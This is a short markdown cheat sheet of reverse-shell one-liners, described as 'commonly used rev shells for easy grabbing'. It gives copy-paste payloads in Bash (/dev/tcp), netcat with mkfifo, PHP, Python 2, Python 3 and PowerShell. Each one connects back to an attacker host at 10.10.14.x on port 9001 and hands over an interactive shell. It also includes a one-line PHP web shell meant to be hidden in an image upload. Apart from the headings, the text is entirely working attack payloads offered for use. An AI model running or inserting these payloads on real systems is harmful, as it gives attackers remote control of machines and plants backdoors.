# Reverse Shells

Commonly used rev shells for easy grabbing.

## Bash

```shell
bash -i >& /dev/tcp/10.10.14.1/9001 0>&1
```

## nc mkfifo

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.10 9001 >/tmp/f
```

## PHP

```shell
php -r '$sock=fsockopen("10.10.14.1",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## PHP Payload In Image

```php
<?php system($_REQUEST['cmd']); ?>
```

## Python 2

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## Python 3

```shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## PowerShell

```shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
